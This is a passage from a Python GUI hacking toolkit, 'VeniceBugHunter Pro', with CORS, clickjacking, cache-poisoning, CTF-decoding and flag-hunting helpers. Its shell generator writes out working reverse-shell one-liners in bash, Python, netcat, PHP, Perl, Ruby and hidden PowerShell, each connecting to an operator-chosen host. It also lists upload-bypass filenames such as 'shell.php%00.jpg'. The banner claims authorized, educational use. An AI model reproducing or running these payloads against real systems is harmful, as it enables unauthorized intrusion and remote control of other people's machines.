                            self.log(f"[CORS] Vulnerable! Origin: {origin}", "CRITICAL")
                            
                except:
                    pass
            
            self.log("CORS test complete", "SUCCESS")
            
        threading.Thread(target=test, daemon=True).start()
    
    def csp_bypass(self):
        """CSP bypass attempts"""
        def bypass():
            self.log("CSP bypass - Try script-src 'unsafe-inline' or 'unsafe-eval'", "INFO")
            
        threading.Thread(target=bypass, daemon=True).start()
    
    def clickjacking_test(self):
        """Clickjacking test"""
        def test():
            url = self.target_url.get()
            if not url:
                self.log("No target specified", "ERROR")
                return
            
            resp = self.make_request("GET", url)
            if resp:
                xfo = resp.headers.get('X-Frame-Options', '')
                csp = resp.headers.get('Content-Security-Policy', '')
                
                if not xfo and 'frame-ancestors' not in csp:
                    self.log("[CLICKJACKING] No protection detected!", "CRITICAL")
                else:
                    self.log(f"Protection: XFO={xfo}, CSP={csp[:100]}", "INFO")
                    
        threading.Thread(target=test, daemon=True).start()
    
    def cache_poison(self):
        """Web cache poisoning"""
        def poison():
            self.log("Cache poisoning - Test with X-Forwarded-Host header", "INFO")
            
        threading.Thread(target=poison, daemon=True).start()
    
    def cache_deception(self):
        """Cache deception"""
        def deception():
            self.log("Cache deception - Try /test.jpg.css or similar", "INFO")
            
        threading.Thread(target=deception, daemon=True).start()
    
    # ==================== CTF ====================
    
    def ctf_encode(self, mode):
        """CTF encoding/decoding"""
        text = self.ctf_input.get("1.0", tk.END).strip()
        if not text:
            return
        
        result = ""
        try:
            if mode == "b64e":
                result = base64.b64encode(text.encode()).decode()
            elif mode == "b64d":
                result = base64.b64decode(text).decode()
            elif mode == "urle":
                result = urllib.parse.quote(text)
            elif mode == "urld":
                result = urllib.parse.unquote(text)
            elif mode == "hexe":
                result = text.encode().hex()
            elif mode == "hexd":
                result = bytes.fromhex(text).decode()
            elif mode == "rot13":
                result = text.translate(str.maketrans(
                    'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz',
                    'NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm'))
            elif mode == "md5":
                result = hashlib.md5(text.encode()).hexdigest()
            elif mode == "sha256":
                result = hashlib.sha256(text.encode()).hexdigest()
            elif mode == "jwt":
                parts = text.split('.')
                result = json.dumps(json.loads(base64.b64decode(parts[1] + '==')), indent=2)
            elif mode == "htmle":
                result = html.escape(text)
            elif mode == "htmld":
                result = html.unescape(text)
        except Exception as e:
            result = f"Error: {e}"
        
        self.log(f"{mode}: {result[:200]}", "SUCCESS")
    
    def hunt_flags(self):
        """Hunt for CTF flags"""
        def hunt():
            url = self.target_url.get()
            if not url:
                self.log("No target specified", "ERROR")
                return
            
            patterns = [p.strip() for p in self.flag_patterns.get().split(',')]
            
            resp = self.make_request("GET", url)
            if not resp:
                return
            
            self.log("Hunting for flags...", "INFO")
            
            for pattern in patterns:
                matches = re.findall(rf'{pattern}\{{[^}}]+\}}', resp.text)
                for match in matches:
                    self.log(f"[FLAG FOUND] {match}", "CRITICAL")
            
            # Check headers
            for header, value in resp.headers.items():
                for pattern in patterns:
                    if pattern.lower() in value.lower():
                        self.log(f"[FLAG in Header] {header}: {value}", "CRITICAL")
                        
        threading.Thread(target=hunt, daemon=True).start()
    
    def ctf_file_check(self):
        """Check for CTF files"""
        def check():
            base = self.target_url.get()
            if not base:
                self.log("No target specified", "ERROR")
                return
            
            files = [f for f, v in self.ctf_file_vars.items() if v.get()]
            
            self.log(f"Checking {len(files)} CTF files", "INFO")
            
            for f in files:
                url = f"{base}/{f}"
                resp = self.make_request("GET", url)
                if resp and resp.status_code == 200:
                    self.log(f"[FOUND] {url}", "SUCCESS")
                    
        threading.Thread(target=check, daemon=True).start()
    
    # ==================== EXPLOIT ====================
    
    def generate_shell(self):
        """Generate reverse shell"""
        ip = self.shell_ip.get()
        port = self.shell_port.get()
        shell_type = self.shell_type.get()
        
        shells = {
            "bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
            "python": f"python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            "nc": f"nc -e /bin/sh {ip} {port}",
            "php": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
            "perl": f"perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
            "ruby": f"ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
            "powershell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}",
        }
        
        shell = shells.get(shell_type, shells["bash"])
        self.shell_output.delete("1.0", tk.END)
        self.shell_output.insert(tk.END, shell)
        self.log(f"Generated {shell_type} reverse shell", "SUCCESS")
    
    def upload_bypass(self):
        """File upload bypass"""
        def bypass():
            url = self.upload_url.get()
            if not url:
                self.log("No upload URL specified", "ERROR")
                return
            
            self.log("Testing file upload bypass techniques", "INFO")
            self.log("Try: shell.php.jpg, shell.php%00.jpg, shell.phtml", "INFO")
            
        threading.Thread(target=bypass, daemon=True).start()
    
    # ==================== CONTROL ====================
    
    def start_all(self):
        """Start all enabled attacks"""
        self.running = True
        self.pause_event.set()
        self.log("Starting all enabled attacks...", "INFO")
        
        # Start based on current tab
        current = self.notebook.index(self.notebook.select())
        tabs = {
            0: [self.subdomain_enum, self.port_scan],
            1: [self.dir_bruteforce, self.xss_scan, self.sql_scan],
            2: [self.sql_auth_bypass],
            3: [self.banner_grab],
            4: [self.cors_test, self.header_injection_test],
            5: [self.hunt_flags],
        }
        
        for func in tabs.get(current, []):
            func()
    
    def pause_attack(self):
        """Pause/resume attacks"""
        if self.pause_event.is_set():
            self.pause_event.clear()
            self.log("Paused", "WARNING")
        else:
            self.pause_event.set()
            self.log("Resumed", "SUCCESS")
    
    def stop_attack(self):
        """Stop all attacks"""
        self.running = False
        self.log("Stopping all attacks...", "WARNING")
    
    def save_results(self):
        """Save results to file"""
        try:
            os.makedirs(self.output_dir.get(), exist_ok=True)
            filename = f"{self.output_dir.get()}/scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write(self.console.get("1.0", tk.END))
            self.log(f"Results saved to {filename}", "SUCCESS")
        except Exception as e:
            self.log(f"Save error: {e}", "ERROR")
    
    def clear_console(self):
        """Clear console"""
        self.console.delete("1.0", tk.END)
        self.stats = {'requests': 0, 'success': 0, 'failed': 0, 'vulnerabilities': 0}
        self.update_stats()
    
    def export_json(self):
        """Export results as JSON"""
        try:
            filename = f"{self.output_dir.get()}/scan_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            data = {
                'timestamp': datetime.now().isoformat(),
                'target': self.target_url.get(),
                'statistics': self.stats,
                'output': self.console.get("1.0", tk.END)
            }
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            self.log(f"Exported to {filename}", "SUCCESS")
        except Exception as e:
            self.log(f"Export error: {e}", "ERROR")

def main():
    print("""
    ╔══════════════════════════════════════════════════════════════════╗
    ║              VeniceBugHunter Pro v2.0                            ║
    ║         Advanced Multi-Proxy Hacking Toolkit                       ║
    ╠══════════════════════════════════════════════════════════════════╣
    ║  ⚠️  WARNING: For authorized security testing only!               ║
    ║      Use at your own risk. Educational purposes only.             ║
    ╚══════════════════════════════════════════════════════════════════╝
    """)
    
    root = tk.Tk()
    app = VeniceBugHunterPro(root)
    root.mainloop()

if __name__ == "__main__":
    main()